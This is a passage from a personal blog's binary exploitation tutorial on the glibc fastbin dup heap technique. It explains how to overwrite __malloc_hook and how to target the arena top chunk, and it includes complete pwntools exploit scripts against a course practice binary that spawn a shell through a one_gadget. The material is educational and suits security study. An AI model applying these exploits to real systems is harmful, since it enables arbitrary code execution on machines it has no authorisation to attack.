<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x68</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"V"</span><span class="p">)</span> <span class="c1"># Allocate the vector chunk</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x68</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"D"</span><span class="p">)</span> <span class="c1"># Allocate a dummy chunk to bypass fastbin's top chunk duplication mitigation</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Duplicating Freed Chunk"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">)</span> <span class="c1"># 1st free - vector chunk</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span> <span class="c1"># Free - dummy chunk</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">)</span> <span class="c1"># 2nd free - vector Chunk</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Evil Chunk"</span><span class="p">)</span>
<span class="n">closest_fake_chunk_header_distance</span> <span class="o">=</span> <span class="mh">0x23</span> <span class="c1"># Find in memory for an address which content "resembles" a chunk head of a suitable size for fastbins</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="n">closest_fake_chunk_header_distance</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x68</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">target</span><span class="p">)</span> <span class="c1"># Allocate the evil chunk: it contains the address of the target in the first 8 bytes which are seen as a fd_pointer by the fastbin since the reused chunk is still pointed by it</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Junk Chunks"</span><span class="p">)</span>
<span class="c1"># Allocate two junk chunks to remove D and V from the fastbin -&gt; only the forged fake chunk will remain into the fastbin</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x68</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"J1"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x68</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"J2"</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Write to target"</span><span class="p">)</span>

<span class="n">gadget_offset</span> <span class="o">=</span> <span class="mh">0xe1fa1</span> <span class="c1"># Found with one_gadget tool</span>
<span class="n">gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">gadget_offset</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"One Gadget Address </span><span class="si">{</span><span class="n">gadget</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="n">gadget</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span>
<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x13</span>

<span class="c1"># Exploit the fastbin duplication</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x68</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">gadget</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="targeting-the-arena-top-chunk">Targeting the arena Top Chunk</h2>
<p>Sometimes it's not that straight forward to overwrite the __malloc_hook. If the fastbin dup is performable multiple times, it's possibile to target the arena top chunk instead of exploiting the "fake" chunk header to set a one gadget for the malloc hook and get a command execution.</p>
<p>The fastbin_dup_2 binary from Udemy "Linux Exploitation 1" is used; it prevents to abuse of the 0x70 fastbin which was necessary in the previous example to bypass the "malloc(): memory corruption (fast)" mitigation since the "fake" chunk header had a 0x7f size.</p>
<blockquote>
<p>1) malloc 0/13<br/>
2) free<br/>
3) quit 
<br/><br/>
&gt; 1<br/>
size: 0x68<br/>
fast chunks only (excluding 0x70)  </p>
</blockquote>
<p>To overcome to this limitation it's possible to exploit the fastbin dup technique <strong>targeting the arena itself</strong>.<br/>
This is done by using the fastbin dup to forge a chunk into the arena itself taking advantage of its structure:</p>
<ul>
<li>Looking at the memory layout of the arena, the 0x30, 0x50 and 0x70* fastbin pointers to their first item in the linked list are in the "right" column, i.e. they're the second 8 bytes foreach memory address</li>
</ul>
<p>Being able to manipulate these pointers means to be able to forge a <em>"fake" chunk header</em> and then perform arbitrary writes into the arena, overwriting, for example, the <strong>top chunk</strong>.</p>
<ul>
<li>Overwriting the top chunk allows to have control on where the next chunk to be allocated will be written in memory, <strong>when the requested size is not tcached or in a fastbin</strong>.</li>
</ul>
<p>The first fastbin dup (0x50 since 0x70 is not available) is used to forge the fake chunk header:</p>
<p><code>malloc(f"{0x48}".encode(), p64(0x61))</code></p>
<p>This will generate the following situation into the (main) arena:</p>
<p><img alt="Forged chunk header into the arena" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-7.png" title="Forged Chunk Header into the arena"/></p>
<p>The second fastbin dup (0x60 since the fake header has size 0x61) will use the first one; it generates an evil chunk whose <strong>fd_pointer</strong> point to the new fake chunk header into the arena. This will make any following malloc for the same size to write into the arena memory.</p>
<p><code>malloc(f"{0x58}".encode(), p64(main_arena_addr + 0x20))</code></p>
<p><img alt="Second fastbin dup" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-8.png" title="The second duplication for the 0x60 fastbin"/></p>
<p>The second duplication is taked advantage by allocating a new chunk which content is the __malloc_hook address; this will overwrite the <strong>top chunk</strong>:</p>
<ul>
<li>A padding of 48 (0x30) is needed </li>
</ul>
<p><code>padding = b"A"*48</code></p>
<p><code>malloc(f"{0x58}".encode(), padding + p64(libc.sym.__malloc_hook - 0x23))</code></p>
<p><img alt="Overridden top chunk" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-9.png" title="The top chunk address is overdden after the two fastbin dup"/></p>
<p>Ideally the target would be the (__malloc_hook - 16) address (considering the size of chunk header) so that malloc would write directly into the __malloc_hook address but a problem arises; from GLIBC 2.29 there's a mitigation checking that <strong>the size of the top chunk is not out of the boundaries of the arena</strong>:</p>
<ul>
<li><strong>"malloc(): corrupted top size"</strong></li>
</ul>
<p>This mitigation is triggered since the (__malloc_hook - 16) contains a value which is way too big since it's an address being considered an integer. To overcome to this problem, it's possible to use the same address used in the previous example as "fake" chunk header since (__malloc_hook - 0x23):</p>
<ul>
<li>It has the format of 0x00000000000000<em>XX</em> (its value is 0x000000000000007f), so it would be considered an acceptable size.</li>
</ul>
<p>The last step is to set the one gadget as the __malloc_hook; some padding is needed:</p>
<p><code>padding = b"B" * (0x23 - 16)</code></p>
<p><code>malloc(f"{0x20}".encode(), padding + p64(gadget))</code></p>
<p>Requesting a new malloc will trigger a the hook, executing the gadget and so opening a shell.</p>
<p><strong>For this particular binary</strong> the constraint of the used one_gadget it's not satisfied; the <em>[rsp+0x50]</em> is not null. Luckly, it seems that the content of that address corresponds to one of the junk chunks allocated during the second duplication.</p>
<p>After setting a break point on malloc() function just before to perform the last malloc triggering the hook:</p>
<blockquote>
<p>gef&gt; x/2gx $rsp + 0x50<br/>
0x7fffffffb8e8: <strong>0x00005555556030b0</strong> <strong>0x0000555555603110</strong><br/>
<br/>
gef&gt; x/s 0x0000555555603110<br/>
0x5555556030b0: "Junk3"<br/>
<br/>
gef&gt; x/s 0x00005555556030b0<br/>
0x5555556030b0: "Junk4"</p>
</blockquote>
<p>The "Junk3" will be passed as first argument (argv[1]) and "Junk4" as second argument (argv[2]).</p>
<ul>
<li>The "Junk3" chunk content is set to <em>-s\x00</em>: since the one gadget will execute <em>execve("/bin/sh", rsp+0x50, environ)</em>, the -s parameter (it tells the shell to read from stdin) will be passed to /bin/sh as first argument.</li>
<li>Having control also on the second argument allows to pass another parameter when invoking /bin/sh, for example <em>-p</em>. This would allow to exploit an eventual SUID.</li>
</ul>
<p><code>malloc(f"{0x58}".encode(), b"-s\x00")</code></p>
<p>The complete pwntools solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./fastbin_dup_2"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"../.glibc/glibc_2.30_no-tcache/libc.so.6"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./fastbin_dup_2"</span><span class="p">)</span>
<span class="c1">#p = process("./fastbin_dup_2")</span>

<span class="c1"># Use leaked libc puts() address and its offset to determine libc base address</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"puts() @ "</span><span class="p">)</span>
<span class="n">puts_leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="n">puts_leaked_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base_addr</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt;"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size: "</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:"</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="c1"># First fastbin dup</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">"First Dup - Allocating Chunks"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x48</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"V"</span><span class="p">)</span> <span class="c1"># Allocate the vector chunk</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x48</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"D"</span><span class="p">)</span> <span class="c1"># Allocate a dummy chunk to bypass fastbin's top chunk duplication mitigation</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"First Dup - Duplicating Freed Chunk"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">)</span> <span class="c1"># 1st free - vector chunk</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span> <span class="c1"># Free - dummy chunk</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">)</span> <span class="c1"># 2nd free - vector Chunk</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"First Dup - Allocating Evil Chunk"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x48</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">))</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"First Dup - Allocate Junk chunks"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x48</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"Junk1"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x48</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"Junk2"</span><span class="p">)</span>


<span class="nb">print</span><span class="p">(</span><span class="s2">"Second Dup - Allocating Chunks"</span><span class="p">)</span>
<span class="n">main_arena_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">main_arena</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x58</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"V"</span><span class="p">)</span> <span class="c1"># Allocate the vector chunk</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x58</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"D"</span><span class="p">)</span> <span class="c1"># Allocate a dummy chunk to bypass fastbin's top chunk duplication mitigation</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Second Dup - Duplicating Freed Chunk"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"5"</span><span class="p">)</span> <span class="c1"># 1st free - vector chunk</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"6"</span><span class="p">)</span> <span class="c1"># Free - dummy chunk</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"5"</span><span class="p">)</span> <span class="c1"># 2nd free - vector Chunk</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Second Dup - Allocating Evil Chunk"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x58</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_arena_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">))</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Second Dup - Allocate Junk chunks"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x58</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"-s</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span> <span class="c1"># It's passed as first argument (argv[1])to the sh executed by the one gadget</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x58</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span> <span class="c1"># Its' passed as second argument (argv[2])to the sh executed by the one gadget</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Overwrite Top Chunk pointer"</span><span class="p">)</span>
<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mi">48</span>

<span class="c1"># If we were to try writing directly to __malloc_hook address (-16 considering the chunk header) we would get the "malloc(): corrupted top size" mitigation error</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x58</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mh">0x23</span><span class="p">))</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Write one gadget address into __malloc_hook"</span><span class="p">)</span>
<span class="n">gadget_offset</span> <span class="o">=</span> <span class="mh">0xe1fa1</span>
<span class="n">gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">gadget_offset</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"One Gadget Address: </span><span class="si">{</span><span class="n">gadget</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="c1"># -16 is the gadget address size</span>
<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"B"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x23</span> <span class="o">-</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x20</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2025 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "http://localhost:1337",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
    }
  </script>
  <script src="http://localhost:1337/theme/stork/stork.js"></script>

</body>
</html>